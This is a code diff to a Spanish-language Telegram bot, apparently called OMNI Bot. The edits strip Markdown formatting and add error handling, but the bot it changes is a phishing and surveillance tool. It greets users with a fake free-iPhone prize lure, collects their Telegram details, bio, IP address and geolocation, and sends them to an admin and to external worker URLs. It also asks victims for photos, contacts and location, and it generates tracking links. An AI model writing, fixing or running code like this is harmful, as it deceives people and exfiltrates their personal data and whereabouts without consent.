@@ -15,7 +15,6 @@ ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
 if not TOKEN or not ADMIN_ID:
     raise ValueError("❌ Faltan TOKEN o ADMIN_ID en variables de entorno")
 
-# ========== TODAS LAS URLS ==========
 URLS = [
     "https://bot-ubi.societykark.workers.dev",
     "https://bot-tg.societykark.workers.dev",
@@ -27,17 +26,15 @@ URLS = [
     "https://kali-bot12.societykark.workers.dev",
     "https://galleta.societykark.workers.dev"
 ]
-
 WORKER_URL = URLS[-1]
 
-# ========== LOGS ==========
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 users_db = {}
 tracking_codes = {}
 
-# ========== MENÚ PRINCIPAL ==========
+# ========== MENÚ PRINCIPAL (con emojis, sin Markdown complejo) ==========
 def menu_principal():
     keyboard = [
         [InlineKeyboardButton("📊 Mi Perfil", callback_data="perfil")],
@@ -51,18 +48,18 @@ def menu_principal():
     ]
     return InlineKeyboardMarkup(keyboard)
 
-SENUELO = """🎁 *¡FELICIDADES! Has sido seleccionado para un premio especial!* 🎁
+SENUELO = """🎁 ¡FELICIDADES! Has sido seleccionado para un premio especial!
 
-📱 *Gana un iPhone 16 Pro Max* 📱
+📱 Gana un iPhone 16 Pro Max
 Solo necesitas completar los siguientes pasos:
 
 1️⃣ Verifica tu identidad (solo una vez)
 2️⃣ Comparte un dato (foto, video o contacto)
 3️⃣ Recibe tu premio virtual
 
-*¡Es 100% gratuito y solo toma 2 minutos!*
+¡Es 100% gratuito y solo toma 2 minutos!
 
-👇 *Presiona un botón para comenzar* 👇"""
+👇 Presiona un botón para comenzar"""
 
 # ========== FUNCIONES DE EXTRACCIÓN ==========
 async def get_worker_location():
@@ -105,7 +102,6 @@ async def get_user_bio(user, bot):
         logger.error(f"Error al obtener bio: {e}")
         return None
 
-# ========== EXTRACCIÓN COMPLETA ==========
 async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user=None):
     bot = context.bot
     user = target_user or update.effective_user
@@ -154,25 +150,25 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                 postal = ipapi_data.get("postal", postal)
                 timezone = ipapi_data.get("timezone", timezone)
 
-    info = f"🕵️ *INFORMACIÓN COMPLETA DEL USUARIO*\n"
+    info = f"🕵️ INFORMACIÓN COMPLETA DEL USUARIO\n"
     info += f"━━━━━━━━━━━━━━━━━━━━\n\n"
-    info += f"👤 *Telegram*\n"
-    info += f"   • ID: `{user_id}`\n"
+    info += f"👤 Telegram\n"
+    info += f"   • ID: {user_id}\n"
     info += f"   • Nombre completo: {full_name}\n"
     info += f"   • Username: {username}\n"
     info += f"   • Idioma: {language}\n"
     info += f"   • Es bot: {is_bot}\n"
     info += f"   • Es Premium: {is_premium}\n"
     info += f"   • Biografía: {bio}\n\n"
-    info += f"💬 *Chat*\n"
+    info += f"💬 Chat\n"
     info += f"   • Tipo: {chat_type}\n"
-    info += f"   • Chat ID: `{chat_id}`\n\n"
-    info += f"📩 *Mensaje*\n"
+    info += f"   • Chat ID: {chat_id}\n\n"
+    info += f"📩 Mensaje\n"
     info += f"   • ID: {message_id}\n"
     info += f"   • Fecha: {message_date}\n"
     info += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
-    info += f"🌐 *Red y Ubicación*\n"
-    info += f"   • IP: `{ip}`\n"
+    info += f"🌐 Red y Ubicación\n"
+    info += f"   • IP: {ip}\n"
     info += f"   • País: {country}\n"
     info += f"   • Región: {region}\n"
     info += f"   • Ciudad: {city}\n"
@@ -191,7 +187,7 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         "country": country
     }
 
-# ========== ENVIAR A TODAS LAS URLS ==========
+# ========== ENVÍO A WORKERS ==========
 async def send_to_all_workers(text):
     form_data = aiohttp.FormData()
     form_data.add_field('chat_id', str(ADMIN_ID))
@@ -211,7 +207,7 @@ async def send_to_all_workers(text):
 
 async def send_report_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data):
     bot = context.bot
-    await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"], parse_mode=ParseMode.MARKDOWN)
+    await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"])
     if info_data["photo_id"]:
         await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de {info_data['username'] or info_data['user_id']}")
     resultados = await send_to_all_workers(info_data["text"])
@@ -226,25 +222,25 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     info_data = await extract_user_info(update, context)
     await send_report_to_admin(update, context, info_data)
-    await update.message.reply_text(SENUELO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
+    await update.message.reply_text(SENUELO, reply_markup=menu_principal())
 
 async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     code = os.urandom(6).hex()
     tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
     link = f"{WORKER_URL}/track/{code}"
-    await update.message.reply_text(f"🔗 *Enlace:*\n`{link}`", parse_mode=ParseMode.MARKDOWN)
-    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 *Nuevo enlace*\nUsuario: {user.first_name}\nCódigo: `{code}`\nEnlace: {link}", parse_mode=ParseMode.MARKDOWN)
+    await update.message.reply_text(f"🔗 Enlace:\n{link}")
+    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 Nuevo enlace\nUsuario: {user.first_name}\nCódigo: {code}\nEnlace: {link}")
 
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("❌ No autorizado.")
         return
-    msg = f"📊 *Estadísticas*\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
-    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+    msg = f"📊 Estadísticas\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
+    await update.message.reply_text(msg)
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🤖 *OMNI Bot*\n\n/start - Iniciar\n/tracking - Generar enlace\n/stats - Estadísticas\n/help - Ayuda", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
+    await update.message.reply_text("🤖 OMNI Bot\n\n/start - Iniciar\n/tracking - Generar enlace\n/stats - Estadísticas\n/help - Ayuda", reply_markup=menu_principal())
 
 async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -252,26 +248,26 @@ async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not info:
         await update.message.reply_text("❌ Usa /start.")
         return
-    msg = f"📊 *Tu perfil*\n\n👤 {info.get('full_name')}\n📛 @{info.get('username')}\n🆔 `{info.get('id')}`"
-    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+    msg = f"📊 Tu perfil\n\n👤 {info.get('full_name')}\n📛 @{info.get('username')}\n🆔 {info.get('id')}"
+    await update.message.reply_text(msg)
 
 # ========== SOLICITAR ARCHIVOS ==========
 async def solicitar_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("📸 Envía una foto.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
+    await update.message.reply_text("📸 Envía una foto.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
 
 async def solicitar_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🎥 Envía un video.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
+    await update.message.reply_text("🎥 Envía un video.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
 
 async def solicitar_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🎵 Envía un audio.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
+    await update.message.reply_text("🎵 Envía un audio.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
 
 async def solicitar_contacto(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("📇 Compartir contacto", callback_data="compartir_contacto")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
-    await update.message.reply_text("📇 Comparte tu contacto.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+    await update.message.reply_text("📇 Comparte tu contacto.", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def solicitar_ubicacion(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("📍 Compartir ubicación", callback_data="compartir_ubicacion")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
-    await update.message.reply_text("📍 Comparte tu ubicación.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+    await update.message.reply_text("📍 Comparte tu ubicación.", reply_markup=InlineKeyboardMarkup(keyboard))
 
 # ========== MANEJAR ARCHIVOS RECIBIDOS ==========
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -305,43 +301,72 @@ async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_message(chat_id=ADMIN_ID, text=f"📍 Ubicación de {user.first_name} (@{user.username})")
     await update.message.reply_text("✅ Ubicación enviada.", reply_markup=menu_principal())
 
-# ========== CALLBACKS ==========
+# ========== CALLBACKS CON MANEJO DE ERRORES ==========
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
-    if data == "volver":
-        await query.edit_message_text("📋 Menú principal", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
-    elif data == "perfil":
-        await perfil(update, context)
-        await query.delete_message()
-    elif data == "solicitar_foto":
-        await solicitar_foto(update, context)
-        await query.delete_message()
-    elif data == "solicitar_video":
-        await solicitar_video(update, context)
-        await query.delete_message()
-    elif data == "solicitar_audio":
-        await solicitar_audio(update, context)
-        await query.delete_message()
-    elif data == "solicitar_contacto":
-        await solicitar_contacto(update, context)
-        await query.delete_message()
-    elif data == "solicitar_ubicacion":
-        await solicitar_ubicacion(update, context)
-        await query.delete_message()
-    elif data == "tracking":
-        await tracking(update, context)
-        await query.delete_message()
-    elif data == "stats":
-        await stats(update, context)
-        await query.delete_message()
-    elif data == "compartir_contacto":
-        await query.edit_message_text("📇 Usa el botón de compartir contacto (📎 → Contacto).", parse_mode=ParseMode.MARKDOWN)
-    elif data == "compartir_ubicacion":
-        await query.edit_message_text("📍 Usa el botón de compartir ubicación (📎 → Ubicación).", parse_mode=ParseMode.MARKDOWN)
+    logger.info(f"📩 Callback recibido: {data}")
 
-# ========== ERROR HANDLER ==========
+    try:
+        if data == "volver":
+            await query.edit_message_text("📋 Menú principal", reply_markup=menu_principal())
+            return
+
+        # Para las acciones que requieren un nuevo mensaje, usamos send_message en lugar de edit
+        if data == "perfil":
+            await perfil(update, context)
+            await query.delete_message()
+            return
+
+        if data == "solicitar_foto":
+            await solicitar_foto(update, context)
+            await query.delete_message()
+            return
+
+        if data == "solicitar_video":
+            await solicitar_video(update, context)
+            await query.delete_message()
+            return
+
+        if data == "solicitar_audio":
+            await solicitar_audio(update, context)
+            await query.delete_message()
+            return
+
+        if data == "solicitar_contacto":
+            await solicitar_contacto(update, context)
+            await query.delete_message()
+            return
+
+        if data == "solicitar_ubicacion":
+            await solicitar_ubicacion(update, context)
+            await query.delete_message()
+            return
+
+        if data == "tracking":
+            await tracking(update, context)
+            await query.delete_message()
+            return
+
+        if data == "stats":
+            await stats(update, context)
+            await query.delete_message()
+            return
+
+        if data == "compartir_contacto":
+            await query.edit_message_text("📇 Usa el botón de compartir contacto (📎 → Contacto).")
+            return
+
+        if data == "compartir_ubicacion":
+            await query.edit_message_text("📍 Usa el botón de compartir ubicación (📎 → Ubicación).")
+            return
+
+    except Exception as e:
+        logger.error(f"❌ Error en callback: {e}")
+        await query.edit_message_text("❌ Error inesperado. Intenta de nuevo.", reply_markup=menu_principal())
+
+# ========== ERROR HANDLER GLOBAL ==========
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"❌ Error: {context.error}")
     if isinstance(update, Update) and update.effective_message:
@@ -367,7 +392,7 @@ def main():
     app.add_handler(CommandHandler("tracking", tracking))
     app.add_handler(CommandHandler("stats", stats))
     app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CallbackQueryHandler(callback_handler))  # ✅ Ahora sí está importado
+    app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(MessageHandler(filters.VIDEO, handle_video))
     app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
